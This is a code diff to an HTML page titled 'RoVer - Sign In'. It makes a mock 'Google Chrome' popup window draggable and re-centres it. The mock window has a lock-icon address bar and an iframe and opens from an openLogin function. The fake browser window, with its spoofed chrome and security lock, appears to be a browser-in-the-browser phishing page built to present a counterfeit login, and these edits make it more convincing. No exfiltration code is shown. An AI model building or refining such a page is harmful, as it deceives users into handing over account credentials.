@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <title>RoVer - Sign In</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
     *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
@@ -54,11 +54,23 @@
     #popupOverlay{position:fixed;inset:0;background:rgba(0,0,0,.6);opacity:0;visibility:hidden;transition:.25s;z-index:1990}
     #popupOverlay.active{opacity:1;visibility:visible}
 
-    /* Chrome-style window (fits 320x640 iframe) */
-    .mock-window{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(.96);width:360px;height:712px;background:#15171c;color:#d1d5db;border-radius:8px;box-shadow:0 18px 50px rgba(0,0,0,.45);overflow:hidden;opacity:0;visibility:hidden;transition:.25s;z-index:2000}
-    .mock-window.active{opacity:1;visibility:visible;transform:translate(-50%,-50%) scale(1)}
+    /* Chrome-style window sized to fit a 320x640 iframe + bars */
+    .mock-window{
+      position:fixed;
+      width:360px;             /* 320 + side padding/border */
+      height:712px;            /* 640 + 32(title) + 40(toolbar) */
+      left:calc(50% - 180px);
+      top:calc(50% - 356px);
+      background:#15171c;color:#d1d5db;border-radius:8px;
+      box-shadow:0 18px 50px rgba(0,0,0,.45);
+      overflow:hidden; opacity:0; visibility:hidden; transform:scale(.96);
+      transition:.25s; z-index:2000;
+    }
+    .mock-window.active{opacity:1;visibility:visible;transform:scale(1)}
+    .mock-window.dragging .mw-titlebar,
+    .mock-window.dragging .mw-toolbar{cursor:grabbing}
 
-    .mw-titlebar{height:32px;display:grid;grid-template-columns:1fr auto;align-items:center;padding:0 8px;gap:8px;background:#2b2d31;border-bottom:1px solid rgba(255,255,255,.06);user-select:none}
+    .mw-titlebar{height:32px;display:grid;grid-template-columns:1fr auto;align-items:center;padding:0 8px;gap:8px;background:#2b2d31;border-bottom:1px solid rgba(255,255,255,.06);user-select:none;cursor:grab}
     .mw-left{display:flex;align-items:center;gap:8px;min-width:0}
     .mw-logo{width:14px;height:14px}
     .mw-title{font-size:13px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;opacity:.9}
@@ -72,7 +84,7 @@
     .mw-ico.max rect{fill:none}
     .mw-ico.close-x path{stroke-linecap:square}
 
-    .mw-toolbar{height:40px;display:flex;align-items:center;gap:8px;padding:0 8px;background:#1f232a;border-bottom:1px solid rgba(255,255,255,.06);user-select:none}
+    .mw-toolbar{height:40px;display:flex;align-items:center;gap:8px;padding:0 8px;background:#1f232a;border-bottom:1px solid rgba(255,255,255,.06);user-select:none;cursor:grab}
     .mw-omnibox{display:flex;align-items:center;gap:8px;flex:1;height:28px;background:#0f1217;color:#e5e7eb;border:1px solid #374151;border-radius:14px;padding:0 10px}
     .mw-omnibox .lock{width:14px;height:14px;color:#10b981}
     .mw-omnibox input{flex:1;background:transparent;color:inherit;border:0;outline:0;font:inherit}
@@ -135,7 +147,7 @@
   <div id="popupOverlay" class="overlay"></div>
 
   <div id="mockWin" class="mock-window" aria-hidden="true">
-    <div class="mw-titlebar">
+    <div class="mw-titlebar" id="mwTitlebar">
       <div class="mw-left">
         <img class="mw-logo" src="https://www.google.com/chrome/static/images/chrome-logo.svg" alt="Chrome" />
         <div class="mw-title" id="mwTitle">Preview — Google Chrome</div>
@@ -153,7 +165,7 @@
       </div>
     </div>
 
-    <div class="mw-toolbar">
+    <div class="mw-toolbar" id="mwToolbar">
       <div class="mw-omnibox">
         <svg class="lock" viewBox="0 0 24 24" fill="none" aria-hidden="true">
           <path d="M7 10V8a5 5 0 0 1 10 0v2" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/>
@@ -211,6 +223,8 @@
     const mwFrame  = document.getElementById('mwFrame');
     const mwUrl    = document.getElementById('mwUrl');
     const mwTitle  = document.getElementById('mwTitle');
+    const mwTitlebar = document.getElementById('mwTitlebar');
+    const mwToolbar  = document.getElementById('mwToolbar');
 
     function toEmbed(u){
       try{
@@ -231,15 +245,83 @@
       mwUrl.value = u;
       setTitle(target);
       mwFrame.src = target;
-      mockWin.classList.add('active'); popOv.classList.add('active');
+      centerMock();
+      mockWin.classList.add('active');
+      popOv.classList.add('active');
     }
     function closeMock(){
-      mockWin.classList.remove('active'); popOv.classList.remove('active');
+      mockWin.classList.remove('active');
+      popOv.classList.remove('active');
       mwFrame.src = 'about:blank';
     }
     mwClose.addEventListener('click', closeMock);
     popOv.addEventListener('click', closeMock);
     mwUrl.addEventListener('keydown', (e)=>{ if(e.key==='Enter'){ openMock(mwUrl.value); } });
+
+    // Draggable popup (titlebar + toolbar)
+    (function makeDraggable(){
+      const KEEP = 8; // margin so it doesn't stick off-screen
+      let dragging=false, offX=0, offY=0;
+
+      function bounds(){
+        const w = mockWin.offsetWidth, h = mockWin.offsetHeight;
+        return {
+          minL: KEEP - w + KEEP, // allow slight off-screen if you want: set to 0 to clamp fully
+          maxL: window.innerWidth - KEEP,
+          minT: KEEP - h + KEEP,
+          maxT: window.innerHeight - KEEP
+        };
+      }
+      function start(e){
+        const target = e.target;
+        // Don't start drag from inside the URL input
+        if (target.closest('input,textarea,button,a,[role="button"]')) return;
+        dragging = true;
+        mockWin.classList.add('dragging');
+        const r = mockWin.getBoundingClientRect();
+        offX = e.clientX - r.left;
+        offY = e.clientY - r.top;
+        e.preventDefault();
+      }
+      function move(e){
+        if (!dragging) return;
+        const b = bounds();
+        let L = e.clientX - offX;
+        let T = e.clientY - offY;
+        // clamp
+        L = Math.min(Math.max(L, KEEP - mockWin.offsetWidth + KEEP), b.maxL - mockWin.offsetWidth);
+        T = Math.min(Math.max(T, KEEP - mockWin.offsetHeight + KEEP), b.maxT - mockWin.offsetHeight);
+        mockWin.style.left = L + 'px';
+        mockWin.style.top  = T + 'px';
+      }
+      function end(){
+        dragging = false;
+        mockWin.classList.remove('dragging');
+      }
+      function attach(el){
+        el.addEventListener('mousedown', (e)=>{ if(e.button===0) start(e); });
+        window.addEventListener('mousemove', move);
+        window.addEventListener('mouseup', end);
+        // touch
+        el.addEventListener('touchstart', (e)=>{ const t=e.touches[0]; if(!t) return; start(t); }, {passive:false});
+        window.addEventListener('touchmove', (e)=>{ const t=e.touches[0]; if(!t) return; move(t); }, {passive:false});
+        window.addEventListener('touchend', end);
+        window.addEventListener('touchcancel', end);
+      }
+      attach(mwTitlebar);
+      attach(mwToolbar);
+    })();
+
+    function centerMock(){
+      const w = mockWin.offsetWidth, h = mockWin.offsetHeight;
+      const L = Math.max(8, (window.innerWidth  - w)/2);
+      const T = Math.max(8, (window.innerHeight - h)/2);
+      mockWin.style.left = L + 'px';
+      mockWin.style.top  = T + 'px';
+    }
+    window.addEventListener('resize', () => {
+      if (mockWin.classList.contains('active')) centerMock();
+    });
 
     // The Continue button uses this
     window.openLogin = function(){
